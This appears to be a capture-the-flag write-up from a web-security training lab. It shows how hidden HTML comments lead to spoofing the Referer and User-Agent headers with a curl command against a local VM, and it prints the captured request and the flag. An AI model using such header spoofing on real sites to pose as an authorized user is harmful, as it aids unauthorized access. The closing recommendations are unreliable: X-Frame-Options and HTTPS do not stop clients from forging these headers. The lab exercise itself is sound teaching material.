#10_Header_Custom

##Research explanation
- At the bottom of the page, there is a new link - Born2Sec - redirecting us to a new webpage:
http://192.168.56.101/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
- By inspecting the page, we can find, hidden between a lot of information, a functional element: 
-------------------
<!--
You must cumming from : "https://www.nsa.gov/" to go to the next step
-->
et 
<!--																			
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
-------------------
- Based on this info, we will retrive the header request:
-------------------
GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Host: 192.168.43.114
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Referer: http://192.168.56.101/
Accept-Language: fr-fr
Connection: keep-alive
-------------------
- In this request, we will change the web browser by modifying the 'user-agent'.
- In this request, we will change the origin page by modifying the 'referer'.
- Let's use the 'curl' request and its options to be able to do it:
NB: We will also use 'grep' to get only the flag and not the entire webpage
-------------------
curl -A ft_bornToSec --referer https://www.nsa.gov/ 'http://192.168.56.101/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' | grep flag
-------------------
- The flag appeared: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


##Breach Details 
- A mal configured and unsecured header structure is the origin of this kind of breach.
- It can be used to monitor or steal info on the website by faking we are an authorized user.

Recommendation: 
- To avoid header modification, it is possible to configure the header using 'X-Frame-Options' with '.htaccess'
- The use of 'HTTPS' is also helpful to hide sensitive data (as the request origin)
- Additional ressources: 
https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
https://owasp.org/www-project-secure-headers/


##How to:
- In a terminal, do: 
curl -A ft_bornToSec --referer https://www.nsa.gov/ 'http://192.168.56.101/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' | grep flag
- The flag is there